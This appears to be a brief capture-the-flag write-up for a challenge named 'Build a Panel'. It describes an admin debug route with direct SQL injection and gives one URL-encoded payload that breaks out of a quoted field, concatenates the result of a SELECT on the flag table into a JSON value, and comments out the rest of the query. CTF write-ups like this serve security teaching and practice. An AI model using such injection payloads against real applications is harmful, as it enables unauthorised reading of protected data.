# Build a Panel
There is a debug route to send to the admin that has direct SQL injection. We can make it add the flag into the widget table under our panel ID, but since the value field needs to be JSON some padding is needed.

```
/admin/debug/add_widget?panelid=your id&widgetname=flag%27,%20%27{%22type%22:%22%27%20||%20(SELECT%20*%20FROM%20flag%20LIMIT%201)%20||%20%27%22}%27);--&widgetdata=b
```

